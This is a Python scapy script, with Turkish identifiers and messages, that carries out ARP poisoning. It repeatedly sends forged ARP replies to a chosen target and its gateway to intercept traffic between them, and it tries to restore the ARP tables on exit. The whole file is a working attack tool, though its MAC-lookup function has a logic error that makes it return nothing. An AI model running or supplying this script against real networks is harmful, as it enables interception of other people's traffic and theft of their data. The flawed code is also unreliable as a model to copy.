import scapy.all as s
import time
import optparse
def kullanici_girdileri():
	pobj = optparse.OptionParser()
	pobj.add_option("-t","--hedef",dest="ip1",help="Hedefin ip adresi")
	pobj.add_option("-m","--modem",dest="ip2",help="Modemin ip adresi")
	options = pobj.parse_args()[0]
	if not options.ip1:
		print("Hedef ip giriniz")
	if not options.ip2:
		print("Modem ipsini giriniz")
	return options

def arp_zehirleme(ip1,ip2):
	hedef_mac = mac_al(ip1)
	arp_cevabı = s.ARP(op=2,pdst=ip1,hwdst=hedef_mac,psrc=ip2)
	s.send(arp_cevabı,verbose=False)
def arp_yenileme(ip1,ip2):
	hedef_mac = mac_al(ip1)
	modem_mac = mac_al(ip2)
	arp_cevabı = s.ARP(op=2,pdst=ip1,hwdst=hedef_mac,psrc=ip2,hwsrc=modem_mac)
	s.send(arp_cevabı,verbose=False)

def mac_al(ip):
	
	arp_request_packet = s.ARP(pdst=ip)
	broadcast_packet = s.Ether(dst="ff:ff:ff:ff:ff:ff")
	combined_packet = broadcast_packet/arp_request_packet
	answered_list = s.srp(combined_packet,timeout=1,verbose=False)[0]

	if answered_list == "":
       		return answered_list[0][1].hwsrc

number = 0
kullanici_ips = kullanici_girdileri()
kullanici_ip1 = kullanici_ips.ip1
kullanici_ip2 = kullanici_ips.ip2
try:
	while True:

		arp_zehirleme(kullanici_ips.ip1,kullanici_ips.ip2)
		arp_zehirleme(kullanici_ips.ip2,kullanici_ips.ip1)
		number += 2
		print("\rPaketler Gönderiliyor " +str(number),end="")
		time.sleep(3)
except KeyboardInterrupt:
	print("Çık ve Yenile")
	arp_yenileme(kullanici_ips.ip1,kullanici_ips.ip2)
	arp_yenileme(kullanici_ips.ip2,kullanici_ips.ip1)

